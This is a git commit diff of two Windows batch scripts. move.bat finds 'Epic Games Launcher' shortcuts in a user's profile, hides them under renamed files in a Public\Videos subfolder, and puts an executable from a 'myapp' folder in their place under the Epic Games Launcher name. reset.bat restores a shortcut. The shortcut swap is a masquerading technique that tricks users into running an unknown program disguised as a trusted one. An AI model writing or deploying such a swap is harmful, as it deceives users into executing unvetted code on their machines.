48be780002fb60b56862c3295e89133d0e57285d
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-03 22:26:22 +0100

    edited new features

--- move.bat
+++ move.bat
@@ -1,12 +1,14 @@
-
 @echo off
 setlocal enabledelayedexpansion
 
+set counter=0
+
 for /r C:\Users\%USERNAME% %%a in (*) do (
     if "%%~nxa"=="Epic Games Launcher.lnk" (
+        set /a counter+=1
         set p=%%~dpnxa
-        move "!p!" C:\Users\Public\Videos
-        ren "C:\Users\Public\Videos\Epic Games Launcher.lnk" "§.lnk"
+        move "!p!" "C:\Users\Public\Videos\GraphicalUserInterface"
+        ren "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" "§ !counter!.lnk"
         move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "!p!"
         ren "!p!" "Epic Games Launcher.exe"
     )
--- reset.bat
+++ reset.bat
@@ -1,3 +1,2 @@
 move "C:\Users\Public\Videos\§.lnk" "C:\Users\tinof\OneDrive\Desktop"
 ren "C:\Users\tinof\OneDrive\Desktop\§.lnk" "Epic Games Launcher.lnk"
-pause
